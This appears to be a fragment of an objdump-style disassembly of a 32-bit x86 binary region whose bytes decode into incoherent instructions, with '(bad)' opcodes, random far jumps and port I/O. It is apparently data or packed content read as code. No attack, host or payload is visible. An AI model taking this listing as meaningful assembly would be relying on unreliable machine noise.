  422196:	push   cs
  422197:	cmc    
  422198:	out    0x7c,al
  42219a:	sbb    bh,al
  42219c:	add    al,0x43
  42219e:	push   esp
  42219f:	(bad)  
  4221a1:	cdq    
  4221a2:	pushf  
  4221a3:	cld    
  4221a4:	xchg   ebx,eax
  4221a5:	jg     0x422214
  4221a7:	sbb    eax,0x3869ca5c
  4221ac:	or     esi,DWORD PTR [ecx-0x51]
  4221af:	sbb    cl,BYTE PTR [esp+ecx*8]
  4221b2:	sti    
  4221b3:	sbb    eax,DWORD PTR [edx]
  4221b5:	push   ebx
  4221b6:	iret   
  4221b7:	mov    ebx,0x15f17cf9
  4221bc:	and    ebx,DWORD PTR [esi-0x758c2cbb]
  4221c2:	xor    al,0xa6
  4221c4:	pop    ss
	...
  4221d1:	add    cl,bl
  4221d3:	mov    dh,0x66
  4221d5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221d8:	std    
  4221d9:	neg    BYTE PTR [esi]
  4221db:	sub    esp,DWORD PTR [ebx-0x23]
  4221de:	and    al,0xbc
  4221e0:	xchg   ebx,eax
  4221e1:	jg     0x4221a9
  4221e3:	xlat   BYTE PTR ds:[ebx]
  4221e4:	add    DWORD PTR [eax],eax
  4221e6:	pop    ebx
  4221e7:	add    BYTE PTR [eax],al
  4221e9:	add    BYTE PTR [edi-0x11dd28d8],cl
  4221ef:	xchg   esi,eax
  4221f0:	fldcw  WORD PTR ds:0x7a9dfa5c
  4221f6:	add    BYTE PTR [edx-0x27],al
  4221f9:	stos   BYTE PTR es:[edi],al
  4221fa:	mov    eax,0xf25d110
  4221ff:	fdiv   st,st(7)
  422201:	fwait
  422202:	pop    eax
  422203:	xchg   ecx,eax
  422204:	in     eax,0xa1
  422206:	pop    edx
  422207:	fstp   DWORD PTR [ebx+0x15090d97]
  42220d:	or     dh,BYTE PTR [edx+0x2d]
  422210:	dec    ebx
  422211:	ds xor al,0x45
  422214:	cdq    
  422215:	dec    esp
  422216:	rol    DWORD PTR [edi],1
  422218:	aad    0x84
  42221a:	retf   
  42221b:	pushf  
  42221c:	pusha  
  42221d:	test   BYTE PTR [ecx-0x25],0x2e
  422221:	cmp    esp,DWORD PTR [edx]
  422223:	jmp    0x422204
  422225:	sar    BYTE PTR [ebx+0x67],0xb
  422229:	nop
  42222a:	fsub   st,st(4)
  42222c:	push   edi
  42222d:	pop    ebp
  42222e:	js     0x422212
  422230:	sbb    edx,DWORD PTR [edx+edi*4+0x51]
  422234:	call   0x226274c0
  422239:	retf   
  42223a:	jle    0x422299
  42223c:	or     al,0xab
  42223e:	fstp   TBYTE PTR ds:0x21c3eb
  422244:	scas   al,BYTE PTR es:[edi]
	...
  422251:	add    dl,bl
  422253:	xor    dl,BYTE PTR [edi-0x20500076]
  422259:	jb     0x42225e
  42225b:	inc    ebp
  42225c:	mov    ds:0x63488c5c,eax
  422261:	gs and eax,ebx
  422264:	add    DWORD PTR [eax],eax
  422266:	pop    ebx
  422267:	add    BYTE PTR [eax],al
  422269:	add    BYTE PTR [ecx+0x63699d59],al
  42226f:	inc    esp
  422270:	into   
  422271:	or     dl,BYTE PTR [edi+0x4689f5f1]
  422277:	repnz inc ecx
  422279:	iret   
  42227a:	cmp    eax,0x5145291b
  42227f:	leave  
  422280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422281:	les    edx,FWORD PTR [ecx+0x75010418]
  422287:	add    al,0xc
  422289:	push   eax
  42228a:	iret   
  42228b:	fucom  st(3)
  42228d:	into   
  42228e:	in     eax,dx
  42228f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422290:	push   edx
  422291:	fld    DWORD PTR [eax]
  422293:	(bad)  
  422294:	mov    al,BYTE PTR [ecx]
  422296:	sbb    al,0xfa
  422298:	ins    DWORD PTR es:[edi],dx
  422299:	ja     0x422258
  42229b:	js     0x422234
  42229d:	pushf  
  42229e:	scas   eax,DWORD PTR es:[edi]
  42229f:	cli    
  4222a0:	mov    edi,es
  4222a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a3:	jp     0x4222a5
  4222a5:	mov    dl,0xdc
  4222a7:	xor    BYTE PTR [edi+esi*2-0x73b6f9a2],0x8e
  4222af:	pushf  
  4222b0:	shl    BYTE PTR [ecx+ebx*8],0x53
  4222b4:	dec    esp
  4222b5:	sbb    esi,DWORD PTR [ecx]
  4222b7:	jmp    0x422304
  4222b9:	jl     0x422285
  4222bb:	lock adc BYTE PTR [edi],bl
  4222be:	push   es
  4222bf:	repz enter 0xcdaf,0x92
  4222c4:	add    BYTE PTR [eax],0x0
	...
  4222cf:	add    BYTE PTR [eax],al
  4222d1:	add    BYTE PTR [eax-0x1c],cl
  4222d4:	add    ebx,DWORD PTR [ebx-0x8270051]
  4222da:	pop    esi
  4222db:	sub    BYTE PTR [eax+0x6a3dc98f],bl
  4222e1:	aas    
  4222e2:	jl     0x4222bc
  4222e4:	add    DWORD PTR [eax],eax
  4222e6:	pop    ebx
  4222e7:	add    BYTE PTR [eax],al
  4222e9:	add    ch,dl
  4222eb:	iret   
  4222ec:	cwde   
  4222ed:	in     al,0xd1
  4222ef:	in     eax,0xef
  4222f1:	or     bl,BYTE PTR [esi+0x2a]
  4222f4:	icebp  
  4222f5:	imul   ecx,DWORD PTR [ecx+0x1e],0xe36f31b0
  4222fc:	fist   DWORD PTR fs:[ebp+0x681c02c4]
  422303:	pusha  
  422304:	loope  0x42231e
  422306:	rol    DWORD PTR ds:0x2b4f3319,cl
  42230c:	loop   0x4222ae
  42230e:	dec    esi
  42230f:	xor    DWORD PTR [edi+ebp*2-0x5f5dde24],0xffffff99
  422317:	sbb    eax,0xc02c6c70
  42231c:	lods   al,BYTE PTR ds:[esi]
  42231d:	test   eax,0x236faf74
  422322:	sahf   
  422323:	loop   0x42233c
  422325:	loop   0x4222dd
  422327:	jl     0x4222c4
  422329:	and    al,0x74
  42232b:	xchg   esi,eax
  42232c:	jle    0x422326
  42232e:	dec    esp
  42232f:	rol    BYTE PTR ds:0x5e4cffac,1
  422335:	repz in eax,0x41
  422338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422339:	stos   BYTE PTR es:[edi],al
  42233a:	dec    eax
  42233b:	jmp    0x42232b
  42233d:	or     eax,0x2a986842
  422342:	xchg   ecx,eax
  422343:	or     al,0xf3
	...
  422351:	add    BYTE PTR [edx+0x4],dl
  422354:	mov    ds:0x72a6f682,al
  422359:	aam    0x6d
  42235b:	xor    dh,BYTE PTR [edx]
  42235d:	and    eax,0x1b7c7d26
  422362:	xlat   BYTE PTR ds:[ebx]
  422363:	fadd   DWORD PTR [ecx]
  422365:	add    BYTE PTR [ebx+0x0],bl
  422368:	add    BYTE PTR [eax],al
  42236a:	jb     0x42234b
  42236c:	pushf  
  42236d:	outs   dx,BYTE PTR ds:[esi]
  42236e:	fidiv  WORD PTR [eax+edx*2+0x62]
  422372:	lock lods eax,DWORD PTR ds:[esi]
  422374:	std    
  422375:	out    dx,eax
  422376:	or     edi,esi
  422378:	popf   
  422379:	or     bl,ch
  42237b:	lods   eax,DWORD PTR ds:[esi]
  42237c:	adc    DWORD PTR ds:0xe32e6b89,0x2961f9df
  422386:	inc    ebp
  422387:	std    
  422388:	inc    eax
  422389:	inc    ecx
  42238a:	jo     0x4223c9
  42238c:	add    BYTE PTR [eax],bh
  42238e:	rcr    DWORD PTR [esi-0x2f08044f],cl
  422394:	xor    eax,0x241dc1c5
  422399:	inc    ebp
  42239a:	repz fidivr WORD PTR [edx]
  42239d:	inc    ecx
  42239e:	ret    0x3d29
  4223a1:	adc    al,0xd8
  4223a3:	loop   0x422339
  4223a5:	and    eax,0x164e37d1
  4223aa:	int    0x50
  4223ac:	mov    al,ds:0x5fb5f9bf
  4223b2:	add    edx,esp
  4223b4:	out    0x4b,al
  4223b6:	jmp    DWORD PTR [ecx-0x760c02fc]
  4223bc:	je     0x42237b
  4223be:	mov    ah,0x19
  4223c0:	std    
  4223c1:	clc    
  4223c2:	add    dl,0x60
	...
  4223d1:	add    BYTE PTR [eax],bh
  4223d3:	push   0xffffff96
  4223d5:	add    edx,esi
  4223d7:	(bad)  
  4223d8:	mov    ebp,0xdb4ef67b
  4223dd:	out    0x71,eax
  4223df:	dec    DWORD PTR [ebp+0x57]
  4223e2:	xor    bl,cl
  4223e4:	add    DWORD PTR [eax],eax
  4223e6:	pop    ebx
  4223e7:	add    BYTE PTR [eax],al
  4223e9:	add    BYTE PTR [ebp*1-0x28200857],cl
  4223f0:	jno    0x422424
  4223f2:	mov    ebp,0x7bfbbc3a
  4223f7:	clc    
  4223f8:	inc    ebx
  4223f9:	movntq QWORD PTR [ecx-0x5e],mm2
  4223fd:	push   esi
  4223fe:	data16 jl 0x42246a
  422401:	push   0xc0430b8
  422406:	rol    BYTE PTR [ecx-0x1c],cl
  422409:	jns    0x422393
  42240b:	mov    WORD PTR [ecx+0x3867aa35],ss
  422411:	inc    esp
  422412:	leave  
  422413:	bound  esp,QWORD PTR [eax+0x53409989]
  422419:	add    dh,BYTE PTR [ecx+ebx*2]
  42241c:	add    eax,0xfc3622e3
  422421:	pusha  
  422422:	sub    ah,BYTE PTR [ebx]
  422424:	lahf   
  422425:	cwde   
  422426:	adc    al,0xf3
  422428:	lea    edx,[ebx]
  42242a:	xchg   edx,eax
  42242b:	mov    ss:0x6c8d42c,al
  422431:	fwait
  422432:	outs   dx,BYTE PTR ds:[esi]
  422433:	and    al,0x93
  422435:	mov    esi,0x44d9f7ab
  42243a:	loop   0x42242a
  42243c:	pop    ss
  42243d:	enter  0xab7d,0xe4
  422441:	sti    
  422442:	jne    0x4223e3
  422444:	xor    eax,DWORD PTR [eax]
	...
  422452:	jmp    0x7a729f10
  422457:	repz jmp 0x422453
  42245a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42245e:	gs mov al,0xcf
  422461:	(bad)  
  422462:	(bad)  
  422463:	fld    DWORD PTR [ecx]
  422465:	add    BYTE PTR [ebx+0x0],bl
  422468:	add    BYTE PTR [eax],al
  42246a:	repz mov eax,0x469d8775
  422470:	imul   esp,DWORD PTR [esi],0xffffffff
  422473:	mov    ds:0xdf33f26a,eax
  422478:	xchg   edx,eax
  422479:	loope  0x4224f9
  42247b:	xlat   BYTE PTR ds:[ebx]
  42247c:	ins    BYTE PTR es:[edi],dx
  42247d:	sbb    ecx,DWORD PTR [ebx+0x3e]
  422480:	jnp    0x4224d4
  422482:	mov    dl,ah
  422484:	(bad)  
  422485:	pop    eax
  422486:	out    0x6f,al
  422488:	push   es
  422489:	je     0x4224b7
  42248b:	sub    al,0x1d
  42248d:	fisub  WORD PTR [eax+esi*8+0xa2aeb67]
  422494:	enter  0x3871,0x32
  422498:	ss in  al,0x19
  42249b:	clc    
  42249c:	mov    ds:0x87e97fa5,al
  4224a1:	mov    al,0x47
  4224a3:	xchg   edi,eax
  4224a4:	jae    0x42243f
  4224a6:	push   esi
  4224a7:	in     eax,0x34
  4224a9:	mov    eax,ds:0xd46d250e
  4224ae:	mov    ds:0xbaf55a74,eax
  4224b3:	sub    BYTE PTR [edi],ah
  4224b5:	js     0x422474
  4224b7:	fs push edi
  4224b9:	cmp    BYTE PTR [esi-0x76],dl
  4224bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224bd:	shr    bl,cl
  4224bf:	and    DWORD PTR [edi+0x498cd011],esi
	...
  4224d1:	add    BYTE PTR [ebx+0x41],bl
  4224d4:	pop    ebx
  4224d5:	iret   
  4224d6:	pop    ebx
  4224d7:	(bad)  
  4224d9:	aad    0xf
  4224db:	ss dec esp
  4224dd:	dec    esi
  4224de:	out    0xce,eax
  4224e0:	xchg   esp,eax
  4224e1:	outs   dx,DWORD PTR ds:[esi]
  4224e2:	call   0x5b4226c0
  4224e7:	add    BYTE PTR [eax],al
  4224e9:	add    BYTE PTR [ebx],bl
  4224eb:	sbb    DWORD PTR [ebp+0x2d868f09],edi
  4224f1:	adc    DWORD PTR [edx+eax*1+0x553bde01],0x91fb2f86
  4224fc:	add    cl,BYTE PTR [ebx]
  4224fe:	jmp    0x4224b2
  422500:	and    BYTE PTR [ecx-0xb],dl
  422503:	out    0x83,eax
  422505:	fwait
  422506:	call   0x63e8:0x7a6b0cec
  42250d:	add    DWORD PTR [ebp-0x682a3edb],edi
  422513:	inc    ebp
  422514:	jbe    0x422574
  422516:	and    cl,0x55
  422519:	retf   0x602f
  42251c:	pop    edx
  42251d:	les    ebp,FWORD PTR [ebx-0xc]
  422520:	ja     0x422564
  422522:	push   ss
  422523:	arpl   bx,cx
  422525:	int3   
  422526:	mov    bh,0x3
  422528:	fdiv   DWORD PTR [edx+eiz*1]
  42252b:	mov    edx,0xebfd0698
  422530:	daa    
  422531:	dec    ebx
  422532:	ja     0x422519
  422534:	jae    0x4225ad
  422536:	enter  0xdd6e,0xf0
  42253a:	inc    eax
  42253b:	push   es
  42253c:	setl   BYTE PTR [ebx-0xf]
  422540:	dec    ebp
  422542:	fmul   DWORD PTR [esi+0x51]
	...
  422551:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422557:	cld    
  422558:	(bad)  [edi-0x65be08a1]
  42255e:	cmp    BYTE PTR [edi],0xa3
  422561:	hlt    
  422562:	inc    ebx
  422563:	fiadd  DWORD PTR [ecx]
  422565:	add    BYTE PTR [ebx+0x0],bl
  422568:	add    BYTE PTR [eax],al
  42256a:	cmp    BYTE PTR [ecx+ecx*8+0x3f],0xce
  42256f:	push   eax
  422570:	(bad)  
  422571:	call   0x1ce9:0xd4751190
  422578:	gs xor DWORD PTR es:[ebp-0x70],edi
  42257d:	xchg   ecx,eax
  42257e:	arpl   sp,si
  422580:	xor    al,dl
  422582:	loope  0x4225a0
  422584:	sub    eax,0xca50e15d
  422589:	xlat   BYTE PTR ds:[ebx]
  42258a:	std    
  42258b:	or     DWORD PTR cs:[eax],ebx
  42258e:	xor    BYTE PTR [ecx-0x41],dh
  422591:	inc    ecx
  422592:	and    dh,BYTE PTR [ecx]
  422594:	mov    esi,0x4e607d92
  422599:	xor    eax,0xde45a90d
  42259e:	inc    edi
  42259f:	lods   al,BYTE PTR ds:[esi]
  4225a0:	push   cs
  4225a1:	lods   eax,DWORD PTR ds:[esi]
  4225a2:	in     al,0x1
  4225a4:	push   ecx
  4225a5:	pop    ss
  4225a6:	lods   eax,DWORD PTR ds:[esi]
  4225a7:	test   DWORD PTR [ecx],esp
  4225a9:	xor    BYTE PTR [ebx-0x43cd6625],bl
  4225af:	sar    edx,cl
  4225b1:	stos   DWORD PTR es:[edi],eax
  4225b2:	test   BYTE PTR [ebx],dl
  4225b4:	pop    edx
  4225b5:	call   0xa734:0x232e5a4d
  4225bc:	jmp    0xebfcac32
  4225c1:	pusha  
  4225c2:	jmp    0x42cc15
	...
  4225cf:	add    BYTE PTR [eax],al
  4225d1:	add    BYTE PTR [esi+0x73],ch
  4225d4:	lock retf 0xcbfd
  4225d8:	jle    0x4225d1
  4225da:	repz xor eax,0x95ba8ce9
  4225e0:	cmp    al,0x4d
  4225e2:	sahf   
  4225e3:	fiadd  DWORD PTR [ecx]
  4225e5:	add    BYTE PTR [ebx+0x0],bl
  4225e8:	add    BYTE PTR [eax],al
  4225ea:	mov    ds:0x445eff90,eax
  4225ef:	(bad)  
  4225f0:	fadd   DWORD PTR [edx+ebp*1+0x48a19ab]
  4225f7:	mov    edi,0x4b095746
  4225fc:	js     0x4225d5
  4225fe:	bound  ecx,QWORD PTR [esi]
  422600:	lds    ebx,FWORD PTR [ebp-0x2]
  422603:	jge    0x42261b
  422605:	mov    esi,0x960e5301
  42260a:	push   edx
  42260b:	adc    bh,dl
  42260d:	jge    0x422684
  42260f:	push   esi
  422610:	leave  
  422611:	jns    0x4225d4
  422613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422614:	mov    esp,0xc291fb9b
  422619:	or     BYTE PTR [ecx],al
  42261b:	shl    BYTE PTR [esi+0x49],1
  42261e:	xchg   edi,eax
  42261f:	lahf   
  422620:	and    esp,esi
  422622:	adc    eax,0xc1f5c9f5
  422627:	mov    dh,0x7e
  422629:	loop   0x42267a
  42262b:	adc    al,0x0
  42262d:	dec    edx
  42262e:	and    bl,dl
  422630:	xchg   ebx,eax
  422631:	inc    eax
  422632:	(bad)  
  422633:	ins    BYTE PTR es:[edi],dx
  422634:	push   cx
  422636:	imul   ecx,DWORD PTR [esp+edi*8-0x69],0xfffffffc
  42263b:	ins    DWORD PTR es:[edi],dx
  42263c:	lods   al,BYTE PTR ds:[esi]
  42263d:	rol    DWORD PTR [eax+0x1a271578],cl
  422643:	jmp    0x422704
	...
  422650:	add    BYTE PTR [eax],al
  422652:	cmc    
  422653:	adc    al,0xae
  422655:	adc    ebp,edi
  422657:	mov    ebx,0x84e6f6fd
  42265c:	lds    ebp,FWORD PTR [edx+0x40455aa]
  422662:	stc    
  422663:	fiadd  DWORD PTR [ecx]
  422665:	add    BYTE PTR [ebx+0x0],bl
  422668:	add    BYTE PTR [eax],al
  42266a:	push   eax
  42266b:	jmp    0x4226ea
  42266d:	call   0x69302026
  422672:	clc    
  422673:	scas   al,BYTE PTR es:[edi]
  422674:	fistp  DWORD PTR [edi+0x1b]
  422677:	push   ss
  422678:	nop
  422679:	pop    ss
  42267a:	stc    
  42267b:	es mov esi,0x4edd2b78
  422681:	fimul  WORD PTR [esi+0x7e]
  422684:	mov    dl,0x83
  422686:	fcomp  st(1)
  422688:	pop    esp
  422689:	jmp    0x422630
  42268b:	xor    BYTE PTR [ebp+0x24f122d3],0x32
  422692:	ins    DWORD PTR es:[edi],dx
  422693:	or     al,0xba
  422695:	mov    eax,0xf4f7edcc
  42269a:	jae    0x42265f
  42269c:	daa    
  42269d:	and    eax,0xfe8015d0
  4226a2:	cmp    bl,BYTE PTR [ebp+0x5b]
  4226a5:	jmp    FWORD PTR [edi+0x58f7fb66]
  4226ab:	mov    al,ds:0x46416dee
  4226b0:	jl     0x422647
  4226b2:	mov    eax,ds:0x6331b3e1
  4226b7:	push   esi
  4226b8:	fwait
  4226b9:	or     eax,0x495ad01e
  4226be:	xchg   DWORD PTR [ecx],esi
  4226c0:	xchg   ecx,eax
  4226c1:	xchg   BYTE PTR [ebx+ebp*1+0x43],ah
	...
  4226d0:	add    BYTE PTR [eax],al
  4226d2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226d8:	mov    edi,0xbb1c16fb
  4226dd:	rcl    BYTE PTR [esp+edi*8],0xf9
  4226e1:	mov    ecx,0x1db54
  4226e6:	pop    ebx
  4226e7:	add    BYTE PTR [eax],al
  4226e9:	add    BYTE PTR [esi-0x2c81db60],bl
  4226ef:	hlt    
  4226f0:	pop    esp
  4226f1:	pop    ds
  4226f2:	js     0x42271d
  4226f4:	loop   0x42270b
  4226f6:	jb     0x42271c
  4226f8:	gs mov bl,0x4a
  4226fb:	js     0x4226e9
  4226fd:	rcr    DWORD PTR [eax],0xf3
  422700:	jmp    FWORD PTR [eax*2+0x5d1fbd55]
  422707:	mov    edi,0xd4c130ce
  42270c:	xchg   DWORD PTR [edi-0x50],esp
  42270f:	loope  0x422782
  422711:	and    ecx,DWORD PTR [edx+0x45]
  422714:	mov    dh,0x1d
  422716:	mov    ds:0x232b9c8e,al
  42271b:	(bad)  
  42271c:	sub    al,0x79
  42271e:	(bad)  
  42271f:	fidivr DWORD PTR [esi-0x19]
  422722:	ret    0x8410
  422725:	xchg   ebp,eax
  422726:	sbb    dh,bh
  422728:	xchg   edx,eax
  422729:	cmp    dh,dl
  42272b:	and    DWORD PTR [edi+0x2e],esp
  42272e:	arpl   WORD PTR [esi+ebp*4],bp
  422731:	cli    
  422732:	jmp    0x4706c764
  422737:	lods   eax,DWORD PTR ds:[esi]
  422738:	adc    edi,eax
  42273a:	mov    ah,0xc8
  42273c:	mov    DWORD PTR [esi+0x1d],edi
  42273f:	dec    eax
  422740:	out    0x1e,eax
  422742:	cmp    bl,BYTE PTR [eax-0x9]
	...
  422751:	add    ah,dl
  422753:	sqrtps xmm6,xmm0
  422756:	(bad)  
  422758:	cmc    
  422759:	das    
  42275a:	sbb    BYTE PTR [eax],cl
  42275c:	xchg   ebx,eax
  42275d:	iret   
  42275e:	xchg   esi,eax
  42275f:	fisubr WORD PTR [edx-0x8]
  422762:	scas   eax,DWORD PTR es:[edi]
  422763:	fild   DWORD PTR [ecx]
  422765:	add    BYTE PTR [ebx+0x0],bl
  422768:	add    BYTE PTR [eax],al
  42276a:	fcomp  DWORD PTR [ecx+ebp*4-0x67298904]
  422771:	loop   0x4227cc
  422773:	sbb    dl,BYTE PTR [ebx-0x6d]
  422776:	add    BYTE PTR [edi-0x60],ch
  422779:	clc    
  42277a:	sar    BYTE PTR [esi+0x72b59183],cl
  422780:	pop    ebp
  422781:	dec    esi
  422782:	scas   al,BYTE PTR es:[edi]
  422783:	icebp  
  422784:	stos   DWORD PTR es:[edi],eax
  422785:	fucomi st,st(4)
  422787:	lods   eax,DWORD PTR ds:[esi]
  422788:	fwait
  422789:	sbb    ebp,DWORD PTR [ecx]
  42278b:	xlat   BYTE PTR ds:[ebx]
  42278c:	inc    esp
  42278d:	cmp    cl,BYTE PTR [edx]
  42278f:	outs   dx,DWORD PTR ds:[esi]
  422790:	inc    esp
  422791:	fld    st(4)
  422793:	jp     0x42275c
  422795:	push   0xd60effb3
  42279a:	mov    esi,ebx
  42279c:	cmp    esi,DWORD PTR [eax]
  42279e:	fstp   TBYTE PTR [esi]
  4227a0:	jo     0x422743
  4227a2:	lahf   
  4227a3:	xchg   esp,eax
  4227a4:	test   ebx,ebp
  4227a6:	in     eax,dx
  4227a7:	push   cs
  4227a8:	cmp    al,0x2f
  4227aa:	scas   eax,DWORD PTR es:[edi]
  4227ab:	mov    eax,DWORD PTR [edx-0x42a76e42]
  4227b1:	test   al,0x3d
  4227b3:	ror    BYTE PTR [ecx-0x67],0xbb
  4227b7:	int3   
  4227b8:	xor    ebx,eax
  4227ba:	dec    eax
  4227bb:	loope  0x422803
  4227bd:	add    BYTE PTR [eax+0x30],al
  4227c0:	mov    esp,0x60fc79f9
	...
  4227d1:	add    ch,cl
  4227d3:	sub    eax,0xfbf54395
  4227d8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227de:	sar    DWORD PTR fs:0x1dc0abf,cl
  4227e5:	add    BYTE PTR [ebx+0x0],bl
  4227e8:	add    BYTE PTR [eax],al
  4227ea:	je     0x4227fb
  4227ec:	sub    edi,DWORD PTR [edi-0x33b2017a]
  4227f2:	and    BYTE PTR [ebx+0x7],0x2b
  4227f6:	add    BYTE PTR [ebx],cl
  4227f8:	xor    ebx,esp
  4227fa:	xchg   esi,eax
  4227fb:	fdiv   st(6),st
  4227fd:	xchg   BYTE PTR ds:0x6ea2bd20,cl
  422803:	and    BYTE PTR [ebx],dh
  422805:	cmp    ah,BYTE PTR [ebx]
  422807:	mov    eax,0x3e349e45
  42280c:	xor    ebp,esi
  42280e:	dec    ebx
  42280f:	in     al,0x1b
  422811:	movzx  edx,di
  422814:	jb     0x4227d2
  422816:	add    bh,BYTE PTR [edi]
  422818:	xor    eax,0x7b6e2c33
  42281d:	retf   0xdead
  422820:	dec    esp
  422821:	cmc    
  422822:	gs jmp 0x4470:0x6ae44a56
  42282a:	loope  0x422831
  42282c:	dec    edx
  42282d:	inc    dl
  42282f:	mov    esi,0x609aec5e
  422834:	aam    0x5e
  422836:	sbb    al,0x99
  422838:	cmp    al,0xae
  42283a:	mov    dh,bh
  42283c:	adc    ah,dh
  42283e:	push   ecx
  42283f:	cmp    al,0x87
  422841:	inc    edx
  422842:	push   0xb
  422844:	and    eax,DWORD PTR [eax]
	...
  422852:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422856:	test   DWORD PTR [ebx-0xce58301],0xdb7a4cfc
  422860:	hlt    
  422861:	xchg   edx,eax
  422862:	fadd   QWORD PTR gs:[ecx]
  422865:	add    BYTE PTR [ebx+0x0],bl
  422868:	add    BYTE PTR [eax],al
  42286a:	jb     0x4228ea
  42286c:	sub    DWORD PTR [esp+eiz*2],eax
  42286f:	ins    BYTE PTR es:[edi],dx
  422870:	jmp    0x613f:0x72a76791
  422877:	in     al,0xd2
  422879:	and    BYTE PTR [esi-0x3e1cb589],bl
  42287f:	das    
  422880:	fdivr  DWORD PTR [edi-0x1b]
  422883:	sub    esi,ebp
  422885:	push   ebp
  422886:	pop    edx
  422887:	jmp    0xe48c4fda
  42288c:	in     al,dx
  42288d:	into   
  42288e:	fsubr  QWORD PTR [esi-0x14]
  422891:	mov    esp,0x1e8e0165
  422896:	push   ecx
  422897:	adc    dh,0x2d
  42289a:	ret    
  42289b:	rcl    eax,0x74
  42289e:	hlt    
  42289f:	jo     0x42283c
  4228a1:	push   0xffffff87
  4228a3:	dec    edx
  4228a4:	pop    esp
  4228a5:	push   ebx
  4228a6:	inc    esi
  4228a7:	das    
  4228a8:	or     al,BYTE PTR [edi]
  4228aa:	or     eax,0xc4cd77c5
  4228af:	jecxz  0x422928
  4228b1:	sub    al,0xdc
  4228b3:	out    dx,eax
  4228b4:	push   esi
  4228b5:	adc    edi,esp
  4228b7:	popf   
  4228b8:	mov    cl,0x4a
  4228ba:	push   cs
  4228bb:	sar    DWORD PTR [ebx-0x686e1d08],0xdf
  4228c2:	lea    ecx,[esi+0x1c]
	...
  4228d1:	add    BYTE PTR [esi],dh
  4228d3:	add    dl,BYTE PTR [ebp+0xc]
  4228d6:	jne    0x422937
  4228d8:	jg     0x422914
  4228da:	clc    
  4228db:	cs aas 
  4228dd:	push   0xa93cc73f
  4228e2:	hlt    
  4228e3:	iret   
  4228e4:	add    DWORD PTR [eax],eax
  4228e6:	pop    ebx
  4228e7:	add    BYTE PTR [eax],al
  4228e9:	add    BYTE PTR [eax-0x1a],bl
  4228ec:	int    0xf8
  4228ee:	xor    ebp,esi
  4228f0:	mov    bh,0x1d
  4228f2:	es sbb ebx,esi
  4228f5:	dec    ebp
  4228f6:	sub    dl,0x53
  4228f9:	addr16 inc ebp
  4228fb:	test   al,0x42
  4228fd:	dec    eax
  4228fe:	(bad)  
  4228ff:	dec    ebx
  422900:	push   ebx
  422901:	(bad)  [eax+0x8]
  422904:	and    eax,0xed4cba7a
  422909:	xor    al,0x79
  42290b:	cli    
  42290c:	xchg   ecx,eax
  42290d:	sbb    al,0x53
  42290f:	popa   
  422910:	test   BYTE PTR [edx-0x42],al
  422913:	test   al,0xa0
  422915:	cmp    eax,0x5542066d
  42291a:	outs   dx,BYTE PTR ds:[esi]
  42291b:	nop
  42291c:	iret   
  42291d:	xor    DWORD PTR [ebx-0x4da0e86f],ebp
  422923:	(bad)  
  422925:	and    cl,BYTE PTR [ecx]
  422927:	rol    BYTE PTR [edi+0x78],0xbe
  42292b:	retf   0xddf1
  42292e:	xchg   esp,eax
  42292f:	mov    al,ds:0xf276ce4
  422934:	jae    0x4228b9
  422936:	mov    edx,0x88711231
  42293b:	inc    eax
  42293c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42293d:	(bad)  
  42293e:	pop    esp
  42293f:	mov    dh,0xc4
  422941:	daa    
  422942:	inc    eax
  422943:	loop   0x422916
	...
  422951:	add    BYTE PTR [eax],cl
  422953:	mov    cl,0x72
  422955:	cmp    edi,ebx
  422957:	sti    
  422958:	dec    ecx
  422959:	mov    bl,0x94
  42295b:	je     0x422934
  42295d:	call   0xd04f:0x74b08e74
  422964:	add    DWORD PTR [eax],eax
  422966:	pop    ebx
  422967:	add    BYTE PTR [eax],al
  422969:	add    ch,bl
  42296b:	mov    BYTE PTR [edx-0x2e],0x7b
  42296f:	adc    ah,bl
  422971:	jnp    0x42296b
  422973:	js     0x42296f
  422975:	nop
  422976:	(bad)  
  422977:	(bad)  
  422979:	xchg   ebp,eax
  42297a:	xor    DWORD PTR [edi],ebx
  42297c:	hlt    
  42297d:	ins    BYTE PTR es:[edi],dx
  42297e:	pushf  
  42297f:	and    al,0x2
  422981:	out    0x18,al
  422983:	and    BYTE PTR [ebx-0x3fde0384],bh
  422989:	repnz and BYTE PTR [ebx+0x4df47d4c],0x7c
  422991:	daa    
  422992:	cdq    
  422993:	sti    
  422994:	xchg   esp,eax
  422995:	rcl    DWORD PTR [edx-0x3d],0xbc
  422999:	mov    DWORD PTR [edi-0x64fbed20],eax
  42299f:	mov    cl,0xe6
  4229a1:	data16 add al,0xff
  4229a4:	xchg   BYTE PTR [ecx+0x4735e497],ah
  4229aa:	push   ss
  4229ab:	sar    ebp,0x74
  4229ae:	mov    esi,0x1cfe496f
  4229b3:	rol    BYTE PTR [edi],0x1f
  4229b6:	arpl   WORD PTR [esi],bp
  4229b8:	dec    eax
  4229b9:	ret    
  4229ba:	or     ch,BYTE PTR [edx]
  4229bc:	or     DWORD PTR [ebp+0x2f],esp
  4229bf:	cmp    eax,0x404a1f14
  4229c4:	das    
	...
  4229d1:	add    bh,bl
  4229d3:	push   ebx
  4229d4:	mov    dl,0x4f
  4229d6:	mov    esi,0x67d3ffef
  4229db:	xchg   ecx,edi
  4229dd:	adc    al,0xb8
  4229df:	pushf  
  4229e0:	mov    BYTE PTR [edi+0x1d0aa],cl
  4229e6:	pop    ebx
  4229e7:	add    BYTE PTR [eax],al
  4229e9:	add    cl,cl
  4229eb:	pushf  
  4229ec:	dec    ebp
  4229ed:	push   ss
  4229ee:	nop
  4229ef:	pop    ds
  4229f0:	ss mul edi
  4229f3:	dec    eax
  4229f4:	fisub  DWORD PTR ds:0x8de59c8d
  4229fa:	fst    QWORD PTR [edx]
  4229fc:	pop    ebx
  4229fd:	and    eax,0x432507dc
  422a02:	in     eax,0x67
  422a04:	popf   
  422a05:	cmp    eax,0xba2f5574
  422a0a:	adc    al,0x29
